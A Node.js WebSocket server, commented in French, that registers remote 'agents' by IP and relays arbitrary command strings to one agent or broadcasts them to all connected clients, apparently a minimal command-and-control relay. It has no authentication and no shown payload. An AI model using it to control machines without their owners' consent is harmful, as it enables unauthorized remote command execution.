const http = require('http');
const WebSocket = require('ws');
const os = require('os');


const agents = new Map(); // hostname => ws

// Fonction pour récupérer l'IP locale (IPv4 non loopback)
function getLocalIPAddress() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1'; // Fallback si aucun trouvé
}

const localIP = getLocalIPAddress();

// Serveur HTTP minimal
const server = http.createServer((req, res) => {
  res.writeHead(404);
  res.end("WebSocket Server Only");
});

// Serveur WebSocket
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  const ip = req.socket.remoteAddress;
  console.log(`[+] Client connected ->  ${ip}`);





  /* CLIENT SPECIFIQUE */
  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
  
      if (data.type === 'broadcast_command') {
        // On envoie la commande à tous les clients connectés
        const payload = JSON.stringify({
          type: 'command',
          command: data.command
        });
  
        console.log(`[📢] Reçu commande broadcast -> "${data.command}"`);
  
        wss.clients.forEach(client => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(payload);
          }
        });
  
      } else if (data.type === 'register'){
          const ip = data.ip;
  
          agents.set(ip, ws);
  
          console.log(`[📝] Agent enregistré avec IP: ${ip}`);
        
        



      } else if (data.type === 'command') {
        const targetIP = data.target;  // IP cible reçue
        const command = data.command;
      
        console.log(`HOSTNAME AGENT CONNECTED -> "${targetIP}"`);
      
        // Récupère le client WebSocket de l'agent cible
        const targetClient = agents.get(targetIP);
      
        if (targetClient && targetClient.readyState === WebSocket.OPEN) {
          const payload = JSON.stringify({
            type: 'command',
            command: command
          });
      
          targetClient.send(payload);
      
          console.log(`[🎯] Commande envoyée à ${targetIP} -> "${command}"`);
        } else {
          console.log(`[❌] Agent ${targetIP} non trouvé ou déconnecté.`);
        }
      
      


      } 
      
      
      else {
        // Cas par défaut : relay message
        console.log(`[🔁] Message standard reçu :`, msg);
        wss.clients.forEach(client => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(msg);
          }
        });
      }
  
    } catch (err) {
      console.error("[⛔] Erreur parsing JSON :", err.message);
    }
  });
  




  ws.on('close', () => {
    console.log('Client Disconnected');
  });




  


  /* COMMAND AUTO 
  
  setTimeout(() => {
    const command = {
      type: 'command',
      command: ''
    };
    ws.send(JSON.stringify(command));
    console.log('Command Sent:', command.command);
  }, 5000);
*/

});


server.listen(9000, localIP, () => {
  console.log(`Server Websocket is available : ws://${localIP}:9000`);
});
